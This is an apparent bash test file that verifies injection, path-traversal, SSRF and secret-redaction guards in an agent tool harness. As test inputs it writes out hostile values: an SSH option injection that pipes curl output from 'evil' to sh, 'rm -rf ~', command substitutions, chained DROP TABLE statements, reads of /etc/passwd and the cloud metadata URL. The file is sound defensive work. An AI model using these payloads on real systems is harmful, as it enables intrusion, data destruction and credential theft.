#!/usr/bin/env bash
# tests/test_scripts/security_hardening_body.sh — verifies the injection / ungated-
# mutation guards added to ssh/docker/data/pg/mysql/debug. All checks are offline
# (no live host/DB/docker needed): they exercise the guard functions and the
# early-refusal paths. Args: $1=YCA_DIR $2=TMP
set -Euo pipefail
export YCA_DIR="$1"
export YCA_PROJECT_DIR="$2"
source "$YCA_DIR/harness/main.sh" 2>/dev/null
YCA_PROJECT_DIR="$2"; YCA_SAFETY_PATHS="$2"; YCA_UI_MODE=json
for c in pg mysql data ssh docker; do YCA_CAT_ENABLED[$c]=1; done
fail(){ echo "FAIL: $1"; exit 1; }
# assert_reject FN ARG...  — FN must return non-zero (reject). `if FN` keeps set -e happy.
assert_reject(){ local f="$1"; shift; if "$f" "$@" >/dev/null 2>&1; then fail "$f ACCEPTED: $*"; fi; }

# ── sql_single_stmt ────────────────────────────────────────────────────────────
sql_single_stmt 'SELECT 1'                || fail "sql_single_stmt rejected a plain statement"
sql_single_stmt 'SELECT 1;'               || fail "sql_single_stmt rejected a single trailing ;"
assert_reject sql_single_stmt 'SELECT 1; DROP TABLE t'
assert_reject sql_single_stmt 'EXPLAIN SELECT 1; DELETE FROM t'
assert_reject sql_single_stmt 'SET x=off; DELETE FROM t'

# ── _data_sql_readonly: block duckdb filesystem/network escapes ────────────────
_data_sql_readonly 'SELECT * FROM this LIMIT 10' || fail "_data_sql_readonly rejected a plain SELECT"
_data_sql_readonly 'SELECT count(*) FROM this'   || fail "_data_sql_readonly rejected a count"
assert_reject _data_sql_readonly "COPY (SELECT 1) TO '/tmp/x.csv'"
assert_reject _data_sql_readonly "SELECT * FROM read_text('/etc/passwd')"
assert_reject _data_sql_readonly "SELECT * FROM read_csv_auto('/etc/passwd')"
assert_reject _data_sql_readonly "ATTACH '/tmp/x.db' AS y"
assert_reject _data_sql_readonly "INSTALL httpfs"
assert_reject _data_sql_readonly "LOAD httpfs"
assert_reject _data_sql_readonly "SELECT 1; SET enable_external_access=true"
assert_reject _data_sql_readonly "PRAGMA database_list"

# ── _ssh_host_ok: reject option-injection hosts ────────────────────────────────
_ssh_host_ok 'example.com' >/dev/null || fail "_ssh_host_ok rejected a normal host"
_ssh_host_ok 'user@host'   >/dev/null || fail "_ssh_host_ok rejected user@host"
for bad in '-oProxyCommand=curl evil|sh' '-Fmalicious' 'a;rm -rf ~' '$(whoami)' 'a b' '`id`'; do
    assert_reject _ssh_host_ok "$bad"
done

# ── ssh_exec / ssh_journal refuse an option-injection host up front ──────────
YCA_AUTO_CONFIRM=true
out=$(tool_ssh_exec "-oProxyCommand=x" "id" 2>&1 || true)
echo "$out" | grep -qi 'invalid host' || fail "ssh_exec did not reject an option-injection host (got: $out)"
out=$(YCA_TOOL_ARGS_JSON='{"host":"-oProxyCommand=x","unit":"nginx"}' tool_ssh_journal "-oProxyCommand=x" 2>&1 || true)
echo "$out" | grep -qi 'invalid host' || fail "ssh_journal did not reject an option-injection host (got: $out)"

# ── docker_run: no eval → a shell-injection arg must NOT run a shell ────────────
# docker is typically absent in CI; when present, prove the injection is inert.
rm -f "$2/pwned"
if command -v docker >/dev/null 2>&1; then
    tool_docker_run "alpine-nonexistent-xyz; touch $2/pwned" >/dev/null 2>&1 || true
    [[ -e "$2/pwned" ]] && fail "docker_run executed a shell injection (eval not removed)"
fi
# docker_prune with no target must refuse (no destructive default)
out=$(YCA_TOOL_ARGS_JSON='{}' tool_docker_prune "" 2>&1 || true)
if command -v docker >/dev/null 2>&1; then
    echo "$out" | grep -qi 'target required' || fail "docker_prune ran with no explicit target (got: $out)"
fi

# ── pg/mysql query tools refuse ;-chaining before touching any server ──────────
out=$(tool_pg_query "SELECT 1; DROP TABLE t" 2>&1 || true)
echo "$out" | grep -qi 'one statement only' || fail "pg_query allowed ;-chaining (got: $out)"
out=$(tool_pg_explain "EXPLAIN SELECT 1; DROP TABLE t" 2>&1 || true)
echo "$out" | grep -qi 'one statement only' || fail "pg_explain allowed ;-chaining (got: $out)"
out=$(tool_mysql_query "SELECT 1; DROP TABLE t" 2>&1 || true)
echo "$out" | grep -qi 'one statement only' || fail "mysql_query allowed ;-chaining (got: $out)"

# pg_exec/mysql_exec are gated: json mode without auto_confirm auto-denies.
YCA_AUTO_CONFIRM=false
out=$(tool_pg_exec "DELETE FROM t" 2>&1 || true)
echo "$out" | grep -qi 'cancel\|confirm' || fail "pg_exec was not consent-gated (got: $out)"
out=$(tool_mysql_exec "DELETE FROM t" 2>&1 || true)
echo "$out" | grep -qi 'cancel\|confirm' || fail "mysql_exec was not consent-gated (got: $out)"

# ── Batch 2: path-traversal / sandbox-escape ──────────────────────────────────
# fs_extract_archive traversal detector: the regex must catch absolute and ../ members.
if printf '%s\n' 'a/b' 'file.txt'  | grep -qE '(^[[:space:]]*/|(^|/)\.\.(/|$))'; then fail "traversal regex matched a clean listing"; fi
printf '%s\n' '/etc/passwd'        | grep -qE '(^[[:space:]]*/|(^|/)\.\.(/|$))' || fail "traversal regex missed an absolute member"
printf '%s\n' '../evil'            | grep -qE '(^[[:space:]]*/|(^|/)\.\.(/|$))' || fail "traversal regex missed a ../ member"
printf '%s\n' 'a/../../evil'       | grep -qE '(^[[:space:]]*/|(^|/)\.\.(/|$))' || fail "traversal regex missed a nested ../ member"
# integration: an absolute-path tarball must be refused by fs_extract_archive.
echo hi > "$2/abstgt"; tar -czf "$2/abs.tgz" -P "$2/abstgt" 2>/dev/null || true
if [[ -f "$2/abs.tgz" ]]; then
    out=$(tool_fs_extract_archive "$2/abs.tgz" "$2" 2>&1 || true)
    echo "$out" | grep -qiE 'traversal|refused' || fail "fs_extract_archive did not refuse an absolute-path tarball (got: $out)"
fi

# net_port_scan: reject option-injection target and CIDR (validated before the nmap check).
out=$(tool_net_port_scan "-oG/tmp/x" 2>&1 || true)
echo "$out" | grep -qi 'invalid target' || fail "net_port_scan accepted an option-injection target (got: $out)"
out=$(YCA_TOOL_ARGS_JSON='{"target":"10.0.0.0/8"}' tool_net_port_scan "10.0.0.0/8" 2>&1 || true)
echo "$out" | grep -qi 'refused' || fail "net_port_scan accepted a CIDR block (got: $out)"

# kg_parse confines indexing to the project fence.
out=$(YCA_TOOL_ARGS_JSON='{"file":"/etc/passwd"}' tool_kg_parse "/etc/passwd" 2>&1 || true)
echo "$out" | grep -qi 'not allowed' || fail "kg_parse read a file outside the sandbox (got: $out)"

# localdb_exec keeps the scratch db isolated (ATTACH + writefile refused).
YCA_AUTO_CONFIRM=true
out=$(YCA_TOOL_ARGS_JSON="{\"sql\":\"ATTACH '/tmp/x.db' AS y\"}" tool_localdb_exec 2>&1 || true)
echo "$out" | grep -qi 'refused' || fail "localdb_exec allowed ATTACH (got: $out)"
out=$(YCA_TOOL_ARGS_JSON="{\"sql\":\"SELECT writefile('/tmp/x','y')\"}" tool_localdb_exec 2>&1 || true)
echo "$out" | grep -qi 'refused' || fail "localdb_exec allowed writefile (got: $out)"
YCA_AUTO_CONFIRM=false

# ── Batch 3: sensitive-data exposure / SSRF ───────────────────────────────────
# redact_secrets masks YAML and env-style secret values, keeps non-secrets.
r=$(redact_secrets $'password: hunter2\napiKey: abc123\nDB_TOKEN=xyz\nhost: example.com')
if echo "$r" | grep -q 'hunter2'; then fail "redact_secrets leaked a YAML password"; fi
if echo "$r" | grep -q 'abc123';  then fail "redact_secrets leaked an apiKey"; fi
if echo "$r" | grep -q 'xyz';     then fail "redact_secrets leaked an env token"; fi
echo "$r" | grep -q 'example.com' || fail "redact_secrets over-redacted a non-secret line"
echo "$r" | grep -q 'REDACTED'    || fail "redact_secrets produced no redaction marker"

# redis_config refuses credential + glob (full-config) params.
YCA_CAT_ENABLED[redis]=1
for bad in requirepass masterauth '*' 'ma*'; do
    out=$(YCA_TOOL_ARGS_JSON="{\"param\":\"$bad\"}" tool_redis_config "$bad" 2>&1 || true)
    echo "$out" | grep -qi 'refused' || fail "redis_config exposed param '$bad' (got: $out)"
done

# Resolve-then-pin SSRF guard: localhost resolves to a loopback IP, and every
# resolved address is classified internal (so tool_browse rejects + never pins).
_browse_ip_internal 169.254.169.254 || fail "_browse_ip_internal missed the metadata IP"
_browse_ip_internal 10.0.0.5        || fail "_browse_ip_internal missed a private IP"
_browse_ip_internal 8.8.8.8         && fail "_browse_ip_internal wrongly flagged a public IP"
if command -v python3 >/dev/null 2>&1 || command -v dig >/dev/null 2>&1; then
    got_internal=0
    while IFS= read -r _ip; do
        [[ -z "$_ip" ]] && continue
        _browse_ip_internal "$_ip" && got_internal=1
    done < <(_browse_resolve localhost)
    (( got_internal == 1 )) || fail "browse SSRF guard missed localhost -> loopback"
fi
# tool_browse refuses the cloud-metadata IP (lexical floor).
out=$(tool_browse "http://169.254.169.254/latest/meta-data/" 2>&1 || true)
echo "$out" | grep -qiE 'refusing|curl required' || fail "browse did not refuse the metadata IP (got: $out)"

# ── Batch 4: security of the new act-half (files) tools ───────────────────────
YCA_CAT_ENABLED[fs]=1; YCA_AUTO_CONFIRM=true
SB="$2/sec_fs"; rm -rf "$SB"; mkdir -p "$SB"
# fs_rename must not let a '/' in replace escape the folder.
echo x > "$SB/xfile"
out=$(YCA_TOOL_ARGS_JSON="{\"dir\":\"$SB\",\"match\":\"xfile\",\"replace\":\"../escaped\"}" tool_fs_rename 2>&1 || true)
if [[ -e "$SB/../escaped" ]]; then fail "fs_rename escaped the folder via '/' in replace ($out)"; fi
[[ -f "$SB/xfile" ]] || fail "fs_rename lost the file"
# fs_apply refuses batching arbitrary-code / whole-content tools.
echo a > "$SB/a.dat"
for bad in bash write edit fs_apply batch; do
    out=$(YCA_TOOL_ARGS_JSON="{\"glob\":\"$SB/*.dat\",\"tool\":\"$bad\"}" tool_fs_apply 2>&1 || true)
    echo "$out" | grep -qiE 'refused|cannot' || fail "fs_apply allowed batching '$bad' ($out)"
done
# fs_move refuses a dst outside the fence; fs_dedupe/fs_organize confine to it.
out=$(YCA_TOOL_ARGS_JSON="{\"src\":\"$SB/a.dat\",\"dst\":\"/etc/evil_$$\"}" tool_fs_move 2>&1 || true)
echo "$out" | grep -qi 'not allowed' || fail "fs_move allowed a dst outside the fence ($out)"
out=$(YCA_TOOL_ARGS_JSON="{\"path\":\"/etc\"}" tool_fs_dedupe 2>&1 || true)
echo "$out" | grep -qi 'not allowed' || fail "fs_dedupe operated outside the fence ($out)"
YCA_AUTO_CONFIRM=false

# ── bounded fuzz (60 iterations, cheap generation — NOT an expensive loop) ─────
# The guards must never crash and never accept a chained / escaping payload.
i=0
while (( i < 60 )); do
    tok=$(printf '%s' "$SRANDOM" | tr '0-9' 'a-j')
    assert_reject sql_single_stmt "SELECT $tok; DROP $tok"
    assert_reject _data_sql_readonly "COPY $tok TO '/tmp/$tok'"
    assert_reject _data_sql_readonly "SELECT read_text('/$tok')"
    assert_reject _ssh_host_ok "-$tok"
    assert_reject _ssh_host_ok "$tok;$tok"
    (( i++ ))
done

echo "security_hardening_body OK"
